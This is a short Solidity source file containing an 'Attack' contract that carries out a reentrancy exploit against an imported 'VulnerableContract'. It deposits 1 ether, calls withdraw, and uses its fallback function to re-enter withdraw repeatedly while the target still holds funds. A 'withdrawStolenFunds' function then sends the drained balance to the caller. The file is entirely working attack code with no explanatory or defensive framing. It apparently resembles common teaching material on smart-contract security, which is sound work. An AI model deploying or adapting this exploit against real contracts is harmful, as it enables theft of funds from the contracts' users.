// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableContract.sol";

contract Attack {
    VulnerableContract public vulnerableContract;

    constructor(address _vulnerableAddress) {
        vulnerableContract = VulnerableContract(_vulnerableAddress);
    }

    fallback() external payable {
        if (address(vulnerableContract).balance >= 1 ether) {
            vulnerableContract.withdraw(1 ether);
        }
    }

    function attack() external payable {
        vulnerableContract.deposit{value: 1 ether}();
        vulnerableContract.withdraw(1 ether);
    }

    function withdrawStolenFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}
